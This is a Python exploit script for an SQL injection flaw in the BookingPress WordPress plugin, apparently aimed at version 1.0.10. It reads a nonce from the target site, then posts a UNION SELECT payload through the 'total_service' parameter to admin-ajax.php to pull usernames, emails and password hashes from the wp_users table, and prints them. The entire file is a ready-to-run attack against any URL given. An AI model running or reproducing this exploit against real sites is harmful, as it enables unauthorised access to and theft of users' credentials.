import argparse
import re
import requests
import rich
import rich.table
import sys


# REGEX
TITLE_RE = re.compile(r"<title>(.*?)</title>")
VERSION_RE = re.compile(r"bookingpress_axios.*ver=([^']+)'")
NONCE_RE = re.compile(r"_wpnonce:'([^']+)'")
AJAX_RE = re.compile(r'"ajax_url":"([^"]*)"')
# End of regex

if len(sys.argv) < 2:
    rich.print(f"[red][+] Usage[/red]: [yellow]python3 <file_name> -u <Target's URL>[/yellow]")
    sys.exit(1)

# Argument parser
parser = argparse.ArgumentParser()
parser.add_argument("-u", "--url", help="Target's URL", required=True)
args = parser.parse_args()
url = args.url

def MakeRequest():
    r = requests.get(f"{url}/events")
    if match := TITLE_RE.search(r.text):
        title = match.groups(0)[0]
        new_title = re.sub(r"&#8211; ", "", title)
        rich.print(f"[*] Title: [bold green]{new_title}[/bold green]")
    else:
        rich.print(f"[red][*] No title found[/red]")

    if match := VERSION_RE.search(r.text):
        version = match.groups(0)[0]
        rich.print(f"[*] Version: [bold green]{version}[/bold green]")
        if version == "1.0.10":
            rich.print(f"[bold yellow][*] Vulnerable version found![/bold yellow]")

    if match := NONCE_RE.search(r.text):
        nonce = match.groups(0)[0]
        rich.print(f"[*] Nonce: [bold green]{nonce}[/bold green]")

    payload = ") UNION ALL SELECT user_login,user_email,user_pass,NULL,NULL,NULL,NULL,NULL,NULL from wp_users limit 1 offset 1-- -"
    data = {
        "action": "bookingpress_front_get_category_services",
        "_wpnonce": nonce,
        "category_id": 33,
        "total_service": f"5{payload}"
        }
    r2 = requests.post(url=f"{url}/wp-admin/admin-ajax.php", data=data)
    print(r2.text)
    id_1 = (r2.text[29:36])
    mail_1 = (r2.text[66:87])
    passwd_1 = (r2.text[118:153])
    newpasswd_1 = re.sub(r"\\/","", passwd_1)

    rich.print(f"[*] id: [bold green] {id_1} [/bold green]")
    rich.print(f"[*] mail: [bold green] {mail_1} [/bold green]")
    rich.print(f"[*] password: [bold green] {newpasswd_1} [/bold green]")

if __name__ == "__main__":
    MakeRequest()

